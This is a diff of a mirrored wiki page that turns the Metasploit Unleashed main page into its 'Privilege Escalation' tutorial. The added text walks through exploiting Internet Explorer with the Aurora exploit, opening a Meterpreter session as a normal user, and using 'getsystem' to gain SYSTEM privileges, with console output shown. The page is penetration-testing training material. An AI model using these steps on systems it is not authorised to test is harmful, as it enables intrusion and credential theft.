@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Privilege Escalation - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Privilege_Escalation" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Privilege_Escalation&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Privilege_Escalation&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Privilege_Escalation&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,210 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Privilege Escalation</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Privilege_Escalation#column-one">navigation</a>, <a href="Privilege_Escalation#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Frequently, especially with <a href="Client_Side_Exploits" title="Client Side Exploits">client side exploits</a>, you will find that your session only has limited user rights.  This can severely limit actions you can perform on the remote system such as dumping passwords, manipulating the registry, installing backdoors, etc.  Fortunately, Metasploit has a Meterpreter script, 'getsystem', that will use a number of different techniques to attempt to gain SYSTEM level privileges on the remote system.
 <br />
+<br />
+Using the infamous 'Aurora' exploit, we see that our Meterpreter session is only running as a regular user account.
+<br />
+<br />
+<pre>msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) >
+<span style='color:#0000FF;'>[*]</span> Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.161
+<span style='color:#0000FF;'>[*]</span> Sending stage (748544 bytes) to 192.168.1.161
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 3 opened (192.168.1.71:38699 -> 192.168.1.161:4444) at 2010-08-21 13:39:10 -0600
+
+msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>sessions -i 3</span>
+<span style='color:#0000FF;'>[*]</span> Starting interaction with 3...
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>getuid</span>
+Server username: XEN-XP-SP2-BARE\victim
+<u>meterpreter</u> ></pre>
+<br />
+To make use of the 'getsystem' command, we first need to load the 'priv' extension.  Running getsystem with the <b>"-h"</b> switch will display the options available to us.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>use priv</span>
+Loading extension priv...success.
+<u>meterpreter</u> > <span style='color:#13C16A;'>getsystem -h</span>
+Usage: getsystem [options]
+
+Attempt to elevate your privilege to that of local system.
+
+OPTIONS:
+
+    -h        Help Banner.
+    -t   The technique to use. (Default to '0').
+                0 : All techniques available
+                1 : Service - Named Pipe Impersonation (In Memory/Admin)
+                2 : Service - Named Pipe Impersonation (Dropper/Admin)
+                3 : Service - Token Duplication (In Memory/Admin)
+                4 : Exploit - KiTrap0D (In Memory/User)</pre>
+<br />
+We will let Metasploit do the heavy lifting for us and run getsystem without any options.  The script will attempt every method available to it, stopping when it succeeds.  Within the blink of an eye, our session is now running with SYSTEM privileges.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>getsystem</span>
+...got system (via technique 4).
+<u>meterpreter</u> > <span style='color:#13C16A;'>getuid</span>
+Server username: NT AUTHORITY\SYSTEM
+<u>meterpreter</u> ></pre>
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Post_Exploitation" title="MSF Post Exploitation">MSF Post Exploitation</a> &gt; Privilege Escalation</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><strong class="selflink">Privilege Escalation</strong> &#124; <a href="PSExec_Pass_The_Hash" title="PSExec Pass The Hash">PSExec Pass The Hash</a> &#124; <a href="Event_Log_Management" title="Event Log Management">Event Log Management</a> &#124; <a href="Fun_With_Incognito" title="Fun With Incognito">Fun With Incognito</a> &#124; <a href="Interacting_With_The_Registry" title="Interacting With The Registry">Interacting With The Registry</a> &#124; <a href="Enabling_Remote_Desktop" title="Enabling Remote Desktop">Enabling Remote Desktop</a> &#124; <a href="Packet_Sniffing" title="Packet Sniffing">Packet Sniffing</a> &#124; <a href="Pivoting" title="Pivoting">Pivoting</a> &#124; <a href="TimeStomp" title="TimeStomp">TimeStomp</a> &#124; <a href="Screen_Capture" title="Screen Capture">Screen Capture</a> &#124; <a href="Searching_For_Content" title="Searching For Content">Searching For Content</a> &#124; <a href="John_The_Ripper" title="John The Ripper">John The Ripper</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 505/1000000
+Preprocessor generated node count: 2647/1000000
+Post‐expand include size: 4608/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:58-0!*!0!*!*!*!* and timestamp 20131124052123 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Privilege_Escalation&amp;oldid=1331">http://www.offensive-security.com/w/index.php?title=Privilege_Escalation&amp;oldid=1331</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:MSF_Post_Exploitation&amp;action=edit&amp;redlink=1" class="new" title="Category:MSF Post Exploitation (page does not exist)">MSF Post Exploitation</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +695,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.128 secs. --></body></html>
